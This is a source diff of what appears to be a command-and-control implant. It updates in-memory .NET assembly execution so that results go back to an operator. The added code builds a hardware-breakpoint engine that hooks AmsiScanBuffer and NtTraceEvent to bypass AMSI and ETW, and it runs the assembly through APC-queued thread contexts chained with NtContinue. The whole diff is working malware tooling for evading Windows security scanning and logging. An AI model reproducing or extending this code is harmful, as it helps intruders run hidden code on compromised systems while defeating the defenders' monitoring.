@@ -2,6 +2,7 @@
 
 #include <Core/MiniStd.h>
 #include <Core/Dotnet.h>
+#include <Core/HwBpExceptions.h>
 
 #define PIPE_BUFFER 0x10000 * 5
 
@@ -23,6 +24,10 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     INT            ArgumentsCount = 0;
     LONG           idx[ 1 ]       = { 0 };
     VARIANT        Object         = { 0 };
+    NTSTATUS       Status         = STATUS_SUCCESS;
+    DWORD          ThreadId       = 0;
+    HRESULT        Result         = S_OK;
+    BOOL           AmsiIsLoaded   = FALSE;
 
     if ( ! Assembly.Buffer || ! Assembly.Length )
         return FALSE;
@@ -41,7 +46,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     if ( ! Instance.Dotnet->Pipe )
     {
         PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
-        CALLBACK_GETLASTERROR;
+        PACKAGE_ERROR_WIN32;
 
         return FALSE;
     }
@@ -49,7 +54,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     if ( ! ( Instance.Dotnet->File = Instance.Win32.CreateFileW( Instance.Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) )
     {
         PRINTF( "CreateFileW Failed: Error[%d]\n", NtGetLastError() )
-        CALLBACK_GETLASTERROR;
+        PACKAGE_ERROR_WIN32;
 
         return FALSE;
     }
@@ -73,10 +78,10 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 
     /* TODO: Use Hardware breakpoints and the hardware breakpoint engine
      *       written by rad9800 (https://github.com/rad9800/hwbp4mw) */
-    if ( Instance.Session.OSVersion > WIN_VERSION_10 )
+    /* if ( Instance.Session.OSVersion > WIN_VERSION_10 )
     {
         PUTS( "Try to patch amsi" )
-        PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
         PackageAddInt32( PackageInfo, DOTNET_INFO_AMSI_PATCHED );
         if ( AmsiPatched == FALSE )
         {
@@ -93,59 +98,104 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
             PUTS( "Amsi already patched" );
             PackageAddInt32( PackageInfo, 2 );
         }
-        PackageTransmit( PackageInfo, NULL, NULL );
+        PackageTransmit( PackageInfo );
+    } */
+
+    /* if Amsi/Etw bypass is enabled */
+    if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
+    {
+#if _WIN64
+        PUTS( "Try to patch(less) Amsi/Etw" )
+
+        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
+        PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );
+
+        /* check if Amsi is loaded */
+        AmsiIsLoaded = TRUE;
+        if ( ! Instance.Modules.Amsi ) {
+            AmsiIsLoaded = RtAmsi();
+        }
+
+        PUTS( "Init HwBp Engine" )
+        /* use global engine */
+        if ( ! NT_SUCCESS( HwBpEngineInit( NULL, NULL ) ) ) {
+            return FALSE;
+        }
+
+        ThreadId = U_PTR( Instance.Teb->ClientId.UniqueThread );
+
+        /* add Amsi bypass */
+        if ( AmsiIsLoaded )
+        {
+            PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
+            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance.Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
+                PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
+                return FALSE;
+            }
+        }
+
+        /* add Etw bypass */
+        PUTS( "HwBp Engine add NtTraceEvent bypass" )
+        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance.Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
+            PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
+            return FALSE;
+        }
+
+        PackageTransmit( PackageInfo );
+        PackageInfo = NULL;
+#endif
+    }
+    else if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
+        /* todo: add memory patching technique */
+    }
+    else {
+        /* no patching */
     }
 
     /* Let the operator know what version we are going to use. */
-    PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+    PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
     PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
     PackageAddBytes( PackageInfo, Instance.Dotnet->NetVersion.Buffer, Instance.Dotnet->NetVersion.Length );
-    PackageTransmit( PackageInfo, NULL, NULL );
+    PackageTransmit( PackageInfo );
 
     RgsBound[ 0 ].cElements    = Assembly.Length;
     RgsBound[ 0 ].lLbound      = 0;
     Instance.Dotnet->SafeArray = Instance.Win32.SafeArrayCreate( VT_UI1, 1, RgsBound );
 
     PUTS( "CreateDomain..." )
-    if ( Instance.Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( Instance.Dotnet->ICorRuntimeHost, Instance.Dotnet->AppDomainName.Buffer, NULL, &Instance.Dotnet->AppDomainThunk ) != S_OK )
-    {
-        PUTS( "CreateDomain Failed" )
+    if ( ( Result = Instance.Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( Instance.Dotnet->ICorRuntimeHost, Instance.Dotnet->AppDomainName.Buffer, NULL, &Instance.Dotnet->AppDomainThunk ) ) ) {
+        PRINTF( "CreateDomain Failed: %x\n", Result )
         return FALSE;
     }
 
     PUTS( "QueryInterface..." )
-    if ( Instance.Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance.Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance.Dotnet->AppDomain ) != S_OK )
-    {
-        PUTS( "QueryInterface Failed" )
+    if ( ( Result = Instance.Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance.Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance.Dotnet->AppDomain ) ) ) {
+        PRINTF( "QueryInterface Failed: %x\n", Result )
         return FALSE;
     }
 
-    if ( Instance.Win32.SafeArrayAccessData( Instance.Dotnet->SafeArray, &AssemblyData.Buffer ) != S_OK )
-    {
-        PUTS( "SafeArrayAccessData Failed" )
+    if ( ( Result = Instance.Win32.SafeArrayAccessData( Instance.Dotnet->SafeArray, &AssemblyData.Buffer ) ) ) {
+        PRINTF( "SafeArrayAccessData Failed: %x\n", Result )
         return FALSE;
     }
 
     PUTS( "Copy assembly to buffer..." )
     MemCopy( AssemblyData.Buffer, Assembly.Buffer, Assembly.Length );
 
-    if ( Instance.Win32.SafeArrayUnaccessData( Instance.Dotnet->SafeArray ) != S_OK )
-    {
-        PUTS("[-] (SafeArrayUnaccessData) !!")
-        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+    if ( ( Result = Instance.Win32.SafeArrayUnaccessData( Instance.Dotnet->SafeArray ) ) ) {
+        PRINTF("SafeArrayUnaccessData Failed: %x\n", Result )
+        PACKAGE_ERROR_WIN32
     }
 
     PUTS( "AppDomain Load..." )
-    if ( Instance.Dotnet->AppDomain->lpVtbl->Load_3( Instance.Dotnet->AppDomain, Instance.Dotnet->SafeArray, &Instance.Dotnet->Assembly ) != S_OK )
-    {
-        PUTS( "AppDomain Failed" )
+    if ( ( Result = Instance.Dotnet->AppDomain->lpVtbl->Load_3( Instance.Dotnet->AppDomain, Instance.Dotnet->SafeArray, &Instance.Dotnet->Assembly ) ) ) {
+        PRINTF( "AppDomain Failed: %x\n", Result )
         return FALSE;
     }
 
     PUTS( "Assembly EntryPoint..." )
-    if ( Instance.Dotnet->Assembly->lpVtbl->EntryPoint( Instance.Dotnet->Assembly, &Instance.Dotnet->MethodInfo ) != S_OK )
-    {
-        PUTS( "Assembly EntryPoint Failed" )
+    if ( ( Result = Instance.Dotnet->Assembly->lpVtbl->EntryPoint( Instance.Dotnet->Assembly, &Instance.Dotnet->MethodInfo ) ) ) {
+        PRINTF( "Assembly EntryPoint Failed: %x\n", Result )
         return FALSE;
     }
 
@@ -158,17 +208,23 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     Instance.Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
     Instance.Dotnet->vtPsa.parray = Instance.Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );
 
-    for ( LONG i = 0; i <= ArgumentsCount; i++ )
-        Instance.Win32.SafeArrayPutElement( Instance.Dotnet->vtPsa.parray, &i, Instance.Win32.SysAllocString( ArgumentsArray[ i ] ) );
+    for ( LONG i = 0; i < ArgumentsCount; i++ ) {
+        if ( ( Result = Instance.Win32.SafeArrayPutElement( Instance.Dotnet->vtPsa.parray, &i, Instance.Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
+            PRINTF( "Args SafeArrayPutElement Failed: %x\n", Result )
+            return FALSE;
+        }
+    }
 
-    Instance.Win32.SafeArrayPutElement( Instance.Dotnet->MethodArgs, idx, &Instance.Dotnet->vtPsa );
+    if ( ( Result = Instance.Win32.SafeArrayPutElement( Instance.Dotnet->MethodArgs, idx, &Instance.Dotnet->vtPsa ) ) ) {
+        PRINTF( "SafeArrayPutElement Failed: %x\n", Result )
+            return FALSE;
+    }
 
     Instance.Dotnet->StdOut = Instance.Win32.GetStdHandle( STD_OUTPUT_HANDLE );
     Instance.Win32.SetStdHandle( STD_OUTPUT_HANDLE , Instance.Dotnet->File );
 
-    if ( Instance.Dotnet->MethodInfo->lpVtbl->Invoke_3( Instance.Dotnet->MethodInfo, Object, Instance.Dotnet->MethodArgs, &Instance.Dotnet->Return ) != S_OK )
-    {
-        PUTS( "Invoke Assembly Failed" )
+    if ( ( Result = Instance.Dotnet->MethodInfo->lpVtbl->Invoke_3( Instance.Dotnet->MethodInfo, Object, Instance.Dotnet->MethodArgs, &Instance.Dotnet->Return ) ) ) {
+        PRINTF( "Invoke Assembly Failed: %x\n", Result )
         return FALSE;
     }
 
@@ -199,7 +255,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     if ( NT_SUCCESS( Instance.Win32.NtCreateEvent( &Instance.Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
          NT_SUCCESS( Instance.Win32.NtCreateEvent( &Instance.Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
     {
-        if ( NT_SUCCESS( Instance.Syscall.NtCreateThreadEx( &Instance.Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
+        if ( NT_SUCCESS( Instance.Win32.NtCreateThreadEx( &Instance.Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
         {
             Instance.Dotnet->RopInit = NtHeapAlloc( sizeof( CONTEXT ) );
             Instance.Dotnet->RopInvk = NtHeapAlloc( sizeof( CONTEXT ) );
@@ -207,7 +263,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
             Instance.Dotnet->RopExit = NtHeapAlloc( sizeof( CONTEXT ) );
 
             Instance.Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
-            if ( NT_SUCCESS( Instance.Syscall.NtGetContextThread( Instance.Dotnet->Thread, Instance.Dotnet->RopInit ) ) )
+            if ( NT_SUCCESS( Instance.Win32.NtGetContextThread( Instance.Dotnet->Thread, Instance.Dotnet->RopInit ) ) )
             {
                 MemCopy( Instance.Dotnet->RopInvk, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
                 MemCopy( Instance.Dotnet->RopEvnt, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
@@ -221,7 +277,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 Instance.Dotnet->RopInvk->Rdx           = U_PTR( &Object );
                 Instance.Dotnet->RopInvk->R8            = U_PTR( Instance.Dotnet->MethodArgs );
                 Instance.Dotnet->RopInvk->R9            = U_PTR( &Instance.Dotnet->Return );
-                *( PVOID* )( Instance.Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                *( PVOID* )( Instance.Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );
 
                 // This rop tells the main thread (our agent main thread) that the assembly executable finished executing
                 Instance.Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
@@ -229,30 +285,30 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 Instance.Dotnet->RopEvnt->Rip           = U_PTR( Instance.Win32.NtSetEvent );
                 Instance.Dotnet->RopEvnt->Rcx           = U_PTR( Instance.Dotnet->Event );
                 Instance.Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
-                *( PVOID* )( Instance.Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                *( PVOID* )( Instance.Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );
 
                 // Wait til we freed everything from the dotnet
                 Instance.Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
                 Instance.Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
-                Instance.Dotnet->RopExit->Rip           = U_PTR( Instance.Syscall.NtWaitForSingleObject );
+                Instance.Dotnet->RopExit->Rip           = U_PTR( Instance.Win32.NtWaitForSingleObject );
                 Instance.Dotnet->RopExit->Rcx           = U_PTR( Instance.Dotnet->Exit );
                 Instance.Dotnet->RopExit->Rdx           = U_PTR( FALSE );
                 Instance.Dotnet->RopExit->R8            = U_PTR( NULL );
-                *( PVOID* )( Instance.Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                *( PVOID* )( Instance.Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );
 
-                if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Syscall.NtContinue, Instance.Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Syscall.NtContinue, Instance.Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Syscall.NtContinue, Instance.Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
 
                 PUTS( "Resume Thread..." )
-                if ( NT_SUCCESS( Instance.Syscall.NtAlertResumeThread( Instance.Dotnet->Thread, NULL ) ) )
+                if ( NT_SUCCESS( Instance.Win32.NtAlertResumeThread( Instance.Dotnet->Thread, NULL ) ) )
                 {
                     PUTS( "Apc started and assembly invoked." )
 
                     PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
                     PackageAddInt32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
                     PackageAddInt32( PackageInfo, ClientId.UniqueThread );
-                    PackageTransmit( PackageInfo, NULL, NULL );
+                    PackageTransmit( PackageInfo );
 
                     // we have successfully invoked the main function of the assembly executable.
                     Instance.Dotnet->Invoked = TRUE;
@@ -291,9 +347,9 @@ VOID DotnetPushPipe()
             Instance.Win32.ReadFile( Instance.Dotnet->Pipe, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length, &BytesRead, NULL );
             Instance.Dotnet->Output.Length = BytesRead;
 
-            PPACKAGE Package = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_OUTPUT );
+            PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance.Dotnet->RequestID );
             PackageAddBytes( Package, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length );
-            PackageTransmit( Package, NULL, NULL );
+            PackageTransmit( Package );
 
             if ( Instance.Dotnet->Output.Buffer )
             {
@@ -323,7 +379,7 @@ VOID DotnetPush()
 
             Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
             PackageAddInt32( Package, DOTNET_INFO_FINISHED );
-            PackageTransmit( Package, NULL, NULL );
+            PackageTransmit( Package );
 
             PUTS( "Dotnet Invoke thread isn't active anymore." )
             Close = TRUE;
@@ -343,21 +399,23 @@ VOID DotnetClose()
     Instance.Win32.FreeConsole();
 #endif
 
-    PUTS( "Free Event" )
-    if ( Instance.Dotnet->Event )
-        Instance.Win32.NtClose( Instance.Dotnet->Event );
+    if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP ) {
+        HwBpEngineDestroy( NULL );
+    }
 
-    PUTS( "Free Pipe" )
-    if ( Instance.Dotnet->Pipe )
-        Instance.Win32.NtClose( Instance.Dotnet->Pipe );
+    if ( Instance.Dotnet->Event ) {
+        SysNtClose( Instance.Dotnet->Event );
+    }
 
-    PUTS( "Free File" )
-    if ( Instance.Dotnet->File )
-        Instance.Win32.NtClose( Instance.Dotnet->File );
+    if ( Instance.Dotnet->Pipe ) {
+        SysNtClose( Instance.Dotnet->Pipe );
+    }
 
-    PUTS( "Free Rops..." )
-    if ( Instance.Dotnet->RopInit )
-    {
+    if ( Instance.Dotnet->File ) {
+        SysNtClose( Instance.Dotnet->File );
+    }
+
+    if ( Instance.Dotnet->RopInit ) {
         MemSet( Instance.Dotnet->RopInit, 0, sizeof( CONTEXT ) );
         Instance.Win32.LocalFree( Instance.Dotnet->RopInit );
         Instance.Dotnet->RopInit = NULL;
@@ -441,20 +499,16 @@ VOID DotnetClose()
         Instance.Dotnet->MetaHost = NULL;
     }
 
-    PUTS( "Terminate and close thread" )
-    if ( Instance.Dotnet->Thread )
-    {
-        Instance.Syscall.NtTerminateThread( Instance.Dotnet->Thread, 0 );
-        Instance.Win32.NtClose( Instance.Dotnet->Thread );
+    if ( Instance.Dotnet->Thread ) {
+        SysNtTerminateThread( Instance.Dotnet->Thread, 0 );
+        SysNtClose( Instance.Dotnet->Thread );
     }
 
-    PUTS( "Free exit" )
-    if ( Instance.Dotnet->Exit )
-        Instance.Win32.NtClose( Instance.Dotnet->Exit );
+    if ( Instance.Dotnet->Exit ) {
+        SysNtClose( Instance.Dotnet->Exit );
+    }
 
-    PUTS( "Free Dotnet object" )
-    if ( Instance.Dotnet )
-    {
+    if ( Instance.Dotnet ) {
         MemSet( Instance.Dotnet, 0, sizeof( DOTNET_ARGS ) );
         NtHeapFree( Instance.Dotnet );
         Instance.Dotnet = NULL;
